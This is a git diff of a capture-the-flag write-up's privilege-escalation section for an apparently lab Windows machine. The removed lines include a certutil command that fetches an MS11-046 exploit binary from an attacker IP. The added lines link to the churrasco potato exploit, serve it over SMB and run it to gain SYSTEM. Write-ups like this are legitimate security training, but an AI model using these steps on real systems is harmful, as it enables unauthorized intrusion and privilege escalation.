@@ -133,32 +133,44 @@ We got a shell as ```nt authority\network service```, this means we  have to esc
 
 # Privilege Escalation
 
-Running the ```systeminfo``` command
-
-![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/2cb1c3ce-0253-4775-a317-b811473f08ad)
-
-That's an outdated kernel I think, checking for available exploits, I found this
-
-![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/fe8265eb-d315-4f2e-9bda-0c68d3483a84)
-
-You can download the ```.exe``` exploit [here](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS11-046/ms11-046.exe)
-
-Download the exploit and send it over to the target machine
-
-command:```certutil -urlcache -f http://10.10.14.122/ms11-046.exe exploit.exe```
-
-![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/7a8772ad-3256-44d9-8794-2709314d6cbe)
-
-oops, we are unable to run the command hehe.
-
-Moving on😅, running the command ```whoami /priv```
+Running the command ```whoami /priv```
 
 ![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/73f7870f-1161-4e00-9a75-319a23287d8e)
 
-As we can see ```SeImpersonatePrivilege``` is enabaled hehe
+As we can see ```SeImpersonatePrivilege``` is enabaled, so this may be vulnerable to a potato exploit.
+
+We can try [churrasco](https://github.com/Re4son/Churrasco/blob/master/churrasco.exe) here
+
+We'll  be transferring that to the target machine, now ```certutil``` and ```curl``` doesn't work on the target machine. This means we'll be sending the file over using smb
+
+Run this command in the directory where you downloaded the file
+
+command:```smbserver.py share .```
+
+
+Now, on the target machine run this
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/7932bd9a-1053-4464-b53e-13756a6c5110)
+
+We have successfully transferred the file. To run the executable
+
+command:```c.exe -d "cmd.exe"```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/27576008-7737-4681-a3da-8a57e4e73d44)
+
+We have successfully escalated our privileges.
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/4df58a11-c739-4d5a-8068-6527acf5d844)
+
+We have successfully pwned this box😎
 
 
 
+
+
+That will be all for today
+<br> <br>
+[Back To Home](../../index.md)
 
 
 
